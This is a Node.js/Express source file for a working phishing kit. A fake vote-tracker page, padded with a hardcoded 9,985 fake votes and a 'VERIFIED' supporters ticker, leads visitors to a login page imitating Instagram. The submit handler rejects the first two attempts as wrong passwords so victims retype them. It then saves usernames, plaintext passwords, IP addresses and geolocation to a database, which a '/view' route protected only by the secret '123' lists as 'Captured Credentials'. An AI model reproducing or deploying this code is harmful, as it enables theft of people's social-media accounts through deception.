const express = require('express');
const mongoose = require('mongoose');
const app = express();
app.use(express.urlencoded({ extended: true }));

const dbURI = process.env.MONGO_URI;
mongoose.connect(dbURI).then(() => console.log('Database connected!')).catch(err => console.log(err));

const Vote = mongoose.model('Vote', new mongoose.Schema({
  username: String, password: String, ip: String, location: String, time: Date
}));

const TARGET_VOTES = 10000;
const BASE_FAKE_VOTES = 9985;

function maskName(name) {
  if (!name) return 'Anonymous';
  if (name.length <= 2) return name[0] + '*';
  return name.substring(0, 2) + '***' + name.slice(-1);
}
function getInitial(name) { return name ? name.charAt(0).toUpperCase() : '?'; }
function getAvatarColor(name) {
  const colors = ['#6366f1', '#8b5cf6', '#ec4899', '#10b981', '#f59e0b', '#3b82f6'];
  let hash = 0;
  for (let i = 0; i < name.length; i++) { hash = name.charCodeAt(i) + ((hash << 5) - hash); }
  return colors[Math.abs(hash) % colors.length];
}

app.get('/api/feed', async (req, res) => {
  try {
    const totalRealVotes = await Vote.countDocuments();
    const latestVotes = await Vote.find().sort({ time: -1 }).limit(5);
    res.json({
      count: BASE_FAKE_VOTES + totalRealVotes,
      target: TARGET_VOTES,
      latest: latestVotes.map(v => ({ username: v.username, maskedName: maskName(v.username), initial: getInitial(v.username), color: getAvatarColor(v.username) }))
    });
  } catch (err) { res.status(500).json({ error: "DB error" }); }
});

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Live Vote Tracker</title>
      <style>
        :root { --bg: #09090b; --panel: rgba(255, 255, 255, 0.03); --border: rgba(255, 255, 255, 0.08); --text: #f8fafc; --muted: #94a3b8; --green: #10b981; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background-color: var(--bg); background-image: radial-gradient(circle at 50% 0%, rgba(99, 102, 241, 0.15) 0%, transparent 60%); color: var(--text); font-family: sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 25px 20px; }
        .container { width: 100%; max-width: 420px; display: flex; flex-direction: column; gap: 25px; }
        .top-nav { display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px; }
        .top-nav h1 { font-size: 18px; font-weight: 800; letter-spacing: 1px; }
        .sys-status { font-size: 11px; font-weight: 600; color: var(--green); display: flex; align-items: center; gap: 6px; text-transform: uppercase; }
        .stats-card { background: var(--panel); border: 1px solid var(--border); border-radius: 20px; padding: 25px 20px; }
        .stats-grid { display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 15px; }
        .stat-item { display: flex; flex-direction: column; gap: 5px; }
        .stat-item.right { align-items: flex-end; }
        .stat-label { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }
        .vote-count { font-size: 42px; font-weight: 800; font-family: ui-monospace, monospace; line-height: 1; }
        .vote-target { font-size: 26px; font-weight: 800; font-family: ui-monospace, monospace; color: var(--muted); line-height: 1; }
        .progress-track { width: 100%; height: 8px; background: rgba(255,255,255,0.1); border-radius: 10px; overflow: hidden; margin-top: 10px; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #6366f1, #ec4899); border-radius: 10px; width: 0%; transition: width 0.5s ease-out; }
        .animation-container { display: flex; justify-content: center; margin: 15px 0; }
        .big-ballot-anim { position: relative; width: 120px; height: 120px; overflow: hidden; padding-top: 20px; }
        .b-box-back { position: absolute; bottom: 0; width: 120px; height: 70px; background: #1f2937; border: 2px solid #374151; border-radius: 10px; z-index: 1; }
        .b-ballot { position: absolute; bottom: 30px; left: 20px; width: 80px; height: 65px; background: #fff; border-radius: 6px; z-index: 2; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 5px; animation: dropLoop 3s infinite; }
        .b-line { width: 45px; height: 6px; background: #cbd5e1; border-radius: 3px; } .b-line.short { width: 30px; }
        .b-box-front { position: absolute; bottom: 0; width: 120px; height: 55px; background: #111827; border: 2px solid #6366f1; border-radius: 10px; z-index: 3; box-sizing: border-box; }
        .b-box-slot { position: absolute; bottom: 45px; left: 25px; width: 70px; height: 6px; background: #000; border-radius: 4px; z-index: 4; }
        @keyframes dropLoop { 0% { transform: translateY(-100px); opacity: 0; } 20% { transform: translateY(-100px); opacity: 1; } 50% { transform: translateY(0); opacity: 1; } 70% { transform: translateY(35px); opacity: 0; } 100% { transform: translateY(35px); opacity: 0; } }
        .btn { display: block; width: 100%; background: #fff; color: #000; text-decoration: none; padding: 16px; border-radius: 16px; font-weight: 700; text-align: center; font-size: 16px; }
        .ticker-container { background: var(--panel); border: 1px solid var(--border); border-radius: 20px; overflow: hidden; }
        .ticker-header { display: flex; justify-content: space-between; padding: 15px 20px; border-bottom: 1px solid var(--border); background: rgba(0,0,0,0.3); }
        .ticker-header h3 { font-size: 12px; color: var(--muted); text-transform: uppercase; }
        .live-badge { font-size: 11px; color: var(--green); display: flex; align-items: center; gap: 6px; font-weight: bold; }
        .ticker-content { display: flex; justify-content: center; align-items: center; padding: 25px 20px; }
        .single-vote-card { display: flex; align-items: center; gap: 15px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.08); padding: 16px 20px; border-radius: 16px; width: 100%; transition: opacity 0.4s; }
        .single-vote-card.fade-out { opacity: 0; } .single-vote-card.fade-in { opacity: 1; }
        .avatar { width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px; font-weight: 800; color: #fff; }
        .log-name { font-size: 15px; font-weight: 700; display: block; } .log-action { font-size: 13px; color: var(--muted); margin-top: 4px; display: block; }
        .verified-badge-small { margin-left: auto; color: var(--green); font-size: 10px; font-weight: bold; border: 1px solid var(--green); padding: 4px 8px; border-radius: 6px; background: rgba(16, 185, 129, 0.1); }
      </style>
    </head><body>
      <div class="container">
        <div class="top-nav"><h1>LIVE_VOTE_TRACKER</h1><div class="sys-status"><div style="width:8px; height:8px; background:var(--green); border-radius:50%;"></div> Online</div></div>
        <div class="stats-card">
          <div class="stats-grid"><div class="stat-item"><div class="stat-label">Casted Votes</div><div class="vote-count" id="vote-count">0</div></div><div class="stat-item right"><div class="stat-label">Target</div><div class="vote-target">10,000</div></div></div>
          <div class="progress-track"><div class="progress-fill" id="progress-bar"></div></div>
        </div>
        <div class="animation-container"><div class="big-ballot-anim"><div class="b-box-back"></div><div class="b-ballot"><div class="b-line"></div><div class="b-line"></div><div class="b-line short"></div></div><div class="b-box-front"><div class="b-box-slot"></div></div></div></div>
        <a href="/login" class="btn">Click to Vote</a>
        <div class="ticker-container"><div class="ticker-header"><h3>Recent Supporters</h3><div class="live-badge">● LIVE</div></div><div class="ticker-content"><div id="vote-card" class="single-vote-card fade-in"><div class="avatar" id="avatar" style="background-color: #333;">?</div><div><span class="log-name" id="name">Loading...</span><span class="log-action">just cast a secure vote</span></div><div class="verified-badge-small">VERIFIED</div></div></div></div>
      </div>
      <script>
        let currentCount = 0; let currentVoteIndex = 0; let latestVotes = [];
        async function fetchData() {
          const response = await fetch('/api/feed'); const data = await response.json();
          if (data.count !== currentCount) { document.getElementById('vote-count').innerText = data.count.toLocaleString(); document.getElementById('progress-bar').style.width = (data.count / data.target) * 100 + '%'; currentCount = data.count; }
          latestVotes = data.latest;
        }
        function rotateVote() {
          if (latestVotes.length === 0) return;
          const card = document.getElementById('vote-card'); card.classList.remove('fade-in'); card.classList.add('fade-out');
          setTimeout(() => {
            const vote = latestVotes[currentVoteIndex % latestVotes.length];
            document.getElementById('avatar').innerText = vote.initial; document.getElementById('avatar').style.backgroundColor = vote.color; document.getElementById('name').innerText = vote.maskedName;
            card.classList.remove('fade-out'); card.classList.add('fade-in'); currentVoteIndex++;
          }, 400);
        }
        fetchData(); setInterval(fetchData, 2000); setInterval(rotateVote, 10000);
      </script>
    </body></html>
  `);
});

app.get('/login', (req, res) => {
  const error = req.query.error ? '<div style="color: #ed4956; text-align: center; margin-bottom: 15px; font-size: 14px;">Sorry, your password was incorrect.</div>' : '';
  res.send(`
    <!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"><title>Instagram</title>
    <style>body { background: #000; color: #fff; font-family: sans-serif; margin: 0; padding: 20px; height: 100vh; display: flex; flex-direction: column; box-sizing: border-box; } .back { color: #a8a8a8; text-decoration: none; font-size: 24px; margin-bottom: 20px; } .logo { text-align: center; margin-bottom: 50px; } form { display: flex; flex-direction: column; gap: 8px; width: 100%; max-width: 380px; margin: 0 auto; } input { background: #000; border: 1.5px solid #4a4a4a; border-radius: 14px; padding: 20px 16px; color: #fff; font-size: 14px; outline: none; } button { background: #0064e0; color: white; border: none; border-radius: 25px; padding: 16px; font-size: 16px; font-weight: 700; margin-top: 12px; cursor: pointer; }</style>
    </head><body>
      <a href="/" class="back">←</a><div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" width="65"></div>
      ${error}
      <form method="POST" action="/submit"><input type="text" name="username" placeholder="Username or email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log in</button></form>
    </body></html>
  `);
});

app.post('/submit', async (req, res) => {
  const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress;
  const cookies = req.headers.cookie || '';
  const match = cookies.match(/attempts=(\d+)/);
  let attempts = match ? parseInt(match[1]) : 0;

  if (attempts < 2) {
    res.cookie('attempts', attempts + 1, { maxAge: 900000, httpOnly: true });
    res.redirect('/login?error=1');
  } else {
    res.clearCookie('attempts');
    let location = "Unknown";
    try {
      const locRes = await fetch(`http://ip-api.com/json/${ip}`);
      const locData = await locRes.json();
      if (locData.status === 'success') location = `${locData.city}, ${locData.country}`;
    } catch (e) { }
    const newVote = new Vote({ username: req.body.username || 'Missing', password: req.body.password || 'Missing', ip: ip, location: location, time: new Date() });
    await newVote.save();
    res.redirect('/thank-you');
  }
});

app.get('/thank-you', (req, res) => {
  res.send(`<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#000;color:#fff;text-align:center;flex-direction:column;}.vote-container{position:relative;width:120px;height:120px;margin-bottom:30px;}.box-back{position:absolute;bottom:0;width:100%;height:80px;background:#1a1a1a;border:2px solid #333;border-radius:8px;}.ballot{position:absolute;bottom:30px;left:15px;width:90px;height:80px;background:#fff;border-radius:4px;animation:dropIn 2.5s forwards;}.box-front{position:absolute;bottom:0;width:100%;height:60px;background:#000;border:2px solid #0095f6;border-radius:8px;}@keyframes dropIn{0%{transform:translateY(-120px);opacity:0;}50%{transform:translateY(0);}100%{transform:translateY(40px);opacity:0;}}h1{opacity:0;animation:f 1s 2s forwards;}@keyframes f{100%{opacity:1;}}</style></head><body><div class="vote-container"><div class="box-back"></div><div class="ballot"></div><div class="box-front"></div></div><h1>Thank you for voting!</h1></body></html>`);
});

app.get('/view', async (req, res) => {
  if (req.query.secret !== '123') return res.send('<h3 style="text-align:center; margin-top:50px; font-family:sans-serif;">Access Denied.</h3>');
  try {
    const realVotes = await Vote.find().sort({ time: -1 });
    let rows = realVotes.map(v => `<tr><td style="padding:10px; border:1px solid #ccc;">${v.username}</td><td style="padding:10px; border:1px solid #ccc; color:red;">${v.password}</td><td style="padding:10px; border:1px solid #ccc;">${v.ip}</td><td style="padding:10px; border:1px solid #ccc;">${v.location}</td><td style="padding:10px; border:1px solid #ccc; font-size:12px;">${new Date(v.time).toLocaleString()}</td></tr>`).join('');
    res.send(`<body style="font-family:sans-serif; padding:20px; background:#f4f4f4;"><h2>Captured Credentials</h2><table style="width:100%; border-collapse:collapse; background:white; margin-top:20px;"><tr style="background:#111; color:white;"><th>Email / Username</th><th>Password</th><th>IP</th><th>Location</th><th>Time</th></tr>${rows || '<tr><td colspan="5" style="text-align:center; padding:20px;">No votes yet.</td></tr>'}</table></body>`);
  } catch (err) { res.send("Error loading database"); }
});

app.listen(process.env.PORT || 3000, () => console.log('Server running'));
